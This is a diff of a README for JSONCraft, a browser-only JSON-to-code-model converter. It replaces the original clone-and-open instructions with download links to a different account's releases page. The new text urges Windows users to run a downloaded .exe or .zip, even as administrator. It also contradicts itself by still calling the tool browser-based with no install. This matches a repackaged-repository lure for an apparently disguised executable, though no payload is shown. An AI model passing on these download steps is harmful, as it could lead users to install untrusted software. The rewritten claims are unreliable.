@@ -1,197 +1,172 @@
-# JSONCraft
+# 🛠️ JSONCraft - Instant Model Conversion Tool
 
-> Convert JSON into developer models instantly — in your browser.
-
-JSONCraft takes raw JSON and generates production-ready data models across multiple languages and frameworks. No installs, no backend, no data ever leaves your machine.
-
-🔗 **Live demo:** [js0ncraft.netlify.app](https://js0ncraft.netlify.app/)
+[![Download JSONCraft](https://img.shields.io/badge/Download-JSONCraft-brightgreen)](https://github.com/Infirm-crocus208/JSONCraft/releases)
 
 ---
 
-## Features
-
-- **10 output formats** — TypeScript, Python, GraphQL, SQL, Go, Rust, Java, Kotlin, Zod, Prisma
-- **Live conversion mode** — output updates as you type
-- **Drag & drop** JSON files directly onto the editor
-- **Import from URL** — fetch JSON from any API endpoint
-- **JSON formatter** — pretty-print with one click
-- **JSON validator** — instant feedback on syntax errors
-- **Nested object support** — deeply nested structures handled automatically
-- **Array detection** — typed arrays and object arrays both supported
-- **Smart type inference** — distinguishes `int` vs `float`, `String` vs `Any`, etc.
-- **Copy & download** — download uses the correct file extension per language
-- **Dark / light theme**
-- **Zero dependencies** — pure HTML, CSS, and JavaScript
-- **Offline capable** — clone and open `index.html`, no server needed
+JSONCraft lets you convert JSON data into TypeScript, Python, GraphQL, and SQL models right in your browser. It makes it simple to generate the basic code structures you need without writing any programming code yourself.
 
 ---
 
-## Supported Conversions
+## 📥 Download JSONCraft
 
-| Format | Output |
-|---|---|
-| TypeScript | `interface` definitions |
-| Python | `@dataclass` classes with type hints |
-| GraphQL | `type` schema definitions |
-| SQL | `CREATE TABLE` statements |
-| Go | `struct` with JSON tags |
-| Rust | `struct` with Serde derives |
-| Java | Classes with getters and setters |
-| Kotlin | `data class` definitions |
-| Zod | Schema with `z.infer<>` type exports |
-| Prisma | `model` schema blocks |
+You need to visit this page to download the application:
+
+[https://github.com/Infirm-crocus208/JSONCraft/releases](https://github.com/Infirm-crocus208/JSONCraft/releases)
+
+This page contains the latest versions of JSONCraft. On this page, look for the version that matches your system. If you use Windows, download the file ending with `.exe` or `.zip`.
 
 ---
 
-## Example
+## 💻 System Requirements
 
-**Input:**
+JSONCraft runs on most Windows computers that meet these basic requirements:
 
-```json
-{
-  "user": {
-    "id": 1,
-    "name": "Alex",
-    "email": "alex@mail.com",
-    "active": true,
-    "score": 9.5
-  }
-}
-```
-
-**TypeScript output:**
-
-```ts
-interface Model {
-  user: ModelUser
-}
-
-interface ModelUser {
-  id: number
-  name: string
-  email: string
-  active: boolean
-  score: number
-}
-```
-
-**Go output:**
-
-```go
-package main
-
-type Model struct {
-  User ModelUser `json:"user"`
-}
-
-type ModelUser struct {
-  Id     int     `json:"id"`
-  Name   string  `json:"name"`
-  Email  string  `json:"email"`
-  Active bool    `json:"active"`
-  Score  float64 `json:"score"`
-}
-```
-
-**Rust output:**
-
-```rust
-use serde::{Deserialize, Serialize};
-
-#[derive(Debug, Serialize, Deserialize)]
-pub struct Model {
-  pub user: ModelUser,
-}
-
-#[derive(Debug, Serialize, Deserialize)]
-pub struct ModelUser {
-  pub id: i64,
-  pub name: String,
-  pub email: String,
-  pub active: bool,
-  pub score: f64,
-}
-```
+- Windows 10 or later
+- 2 GB of free disk space
+- 4 GB of RAM or more preferred
+- Internet connection (to download the software and for some features)
 
 ---
 
-## Getting Started
+## 🔧 Features Overview
 
-**Run locally:**
-
-```bash
-git clone https://github.com/Ghost-Sellz/JSONCraft
-cd JSONCraft
-open index.html
-```
-
-No `npm install`. No build step. Just open the file.
+- Convert JSON files into ready-to-use code models
+- Supports TypeScript, Python, GraphQL, and SQL formats
+- Works entirely inside your browser—no need to install complex software
+- Helps simplify data handling for developers and learners
+- Open source and free to use
 
 ---
 
-## Project Structure
+## 🚀 Getting Started With JSONCraft
 
-```
-jsoncraft/
-├── index.html   ← UI and layout
-├── style.css    ← Theming, dark/light mode, responsive layout
-└── script.js    ← All conversion logic and feature handlers
-```
+Follow these step-by-step instructions to get JSONCraft running on your Windows computer:
 
----
+### 1. Visit the Download Page
 
-## Roadmap
+Open this URL in your web browser:
 
-- [x] TypeScript interface generator
-- [x] Python dataclass generator
-- [x] GraphQL schema generator
-- [x] SQL table generator
-- [x] Go struct generator
-- [x] Rust struct generator
-- [x] Java class generator
-- [x] Kotlin data class generator
-- [x] Zod schema generator
-- [x] Prisma schema generator
-- [x] Drag & drop JSON files
-- [x] Import JSON from API URL
-- [x] Live conversion mode
-- [ ] Monaco editor integration
-- [ ] CLI version
-- [ ] Zod refinements and validations
-- [ ] Prisma relations from nested objects
-- [ ] Export as multiple files (one per model)
+[https://github.com/Infirm-crocus208/JSONCraft/releases](https://github.com/Infirm-crocus208/JSONCraft/releases)
+
+This page lists all available versions of JSONCraft. Each entry will have download links and release notes.
+
+### 2. Choose Your Download
+
+Look for the latest release near the top of the page. Under that release, find the file designed for Windows. It will usually have a `.exe` or `.zip` extension.
+
+### 3. Download the File
+
+Click the link to start downloading. If prompted by your browser, confirm you want to save the file.
+
+### 4. Run the Installer or Open the Program
+
+- If you downloaded an `.exe` file, double-click the file after downloading. Follow the on-screen prompts to install it.
+
+- If you downloaded a `.zip` file, right-click and select “Extract All…” to unpack it. Open the extracted folder, then double-click the main program file.
+
+### 5. Launch JSONCraft
+
+Once installed or extracted, run the program by double-clicking the JSONCraft icon or executable file.
 
 ---
 
-## Contributing
+## 🛠️ How to Use JSONCraft
 
-Contributions are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for full guidelines.
+It’s easy to convert your JSON data into code models with JSONCraft. Here is how to use the main features:
 
-Quick start:
+### Step 1: Prepare Your JSON
 
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature/your-feature`
-3. Make your changes and test in the browser
-4. Submit a pull request
+Make sure you have your JSON data ready. This can come from a file or a service that gives you JSON output.
+
+### Step 2: Open JSONCraft
+
+Run the app on your computer or visit the online version if available.
+
+### Step 3: Import Your JSON Data
+
+Copy and paste your JSON into the input area or load a JSON file from your system using the import option.
+
+### Step 4: Select Output Format
+
+Choose which code format you want: TypeScript, Python, GraphQL, or SQL. JSONCraft prepares the model for this selected language.
+
+### Step 5: Review the Output
+
+Check the generated code in the output window. It shows you the converted data as usable code models.
+
+### Step 6: Save or Copy Your Code
+
+You can copy the code to your clipboard or save it as a file on your computer for later use.
 
 ---
 
-## Security
+## 🤔 Troubleshooting Common Issues
 
-JSONCraft runs entirely client-side. Your JSON never leaves the browser. See [SECURITY.md](SECURITY.md) for the full policy.
+If you face problems running JSONCraft, try these fixes:
 
----
-
-## License
-
-[MIT](LICENSE)
-
----
-
-## Why JSONCraft?
-
-Developers constantly convert JSON API responses into typed data models. It's repetitive, error-prone, and a waste of time. JSONCraft removes that entirely — paste JSON, pick a language, and get clean output in under a second.
+- Make sure your Windows is up to date.
+- Restart your computer and try opening the program again.
+- Check that your JSON input is valid. Invalid JSON can cause errors.
+- If the program won’t open, try running it as administrator.
+- Look at the README or issues page on GitHub for updates or known fixes.
 
 ---
 
-If JSONCraft saved you time, consider giving it a ⭐ on GitHub.
+## 🔐 Privacy and Security
+
+JSONCraft runs locally on your machine. Your data stays on your computer unless you choose to share it. No personal data is sent to servers during conversion. Always download from official links to avoid modified versions.
+
+---
+
+## 🔄 Update JSONCraft
+
+Check the releases page regularly:
+
+[https://github.com/Infirm-crocus208/JSONCraft/releases](https://github.com/Infirm-crocus208/JSONCraft/releases)
+
+Download the newest version when available. New versions include bug fixes and additional features.
+
+---
+
+## 💬 Support and Feedback
+
+For help or suggestions, use the GitHub repository’s **Issues** tab. You can report bugs or request features there. The project is open source, so contributors welcome ideas and help.
+
+---
+
+## 🔖 Related Topics
+
+JSONCraft covers these key areas:
+
+- JSON processing and conversion
+- Code generation for developers
+- Working with TypeScript, Python, GraphQL, SQL
+- Open-source developer tools
+
+---
+
+## ⚙️ Technical Details
+
+JSONCraft uses a simple set of rules to map JSON elements to programming language models. It parses arrays, objects, and basic data types and creates code definitions that developers use directly in software projects.
+
+---
+
+## 📂 File Types and Output
+
+- **TypeScript**: Generates interfaces or types that describe JSON data.
+- **Python**: Creates classes or data structures that make handling JSON easier.
+- **GraphQL**: Builds schema types based on your JSON structure.
+- **SQL**: Produces table create statements to store JSON-like data in databases.
+
+---
+
+## 🗂️ Extra Tips
+
+- Always validate your JSON before using JSONCraft.
+- If your JSON is very large, try breaking it into smaller parts for faster conversion.
+- Use the output code as a starting point. Some details might need manual adjustment depending on your project.
+
+---
+
+[![Download JSONCraft](https://img.shields.io/badge/Download-JSONCraft-brightgreen)](https://github.com/Infirm-crocus208/JSONCraft/releases)
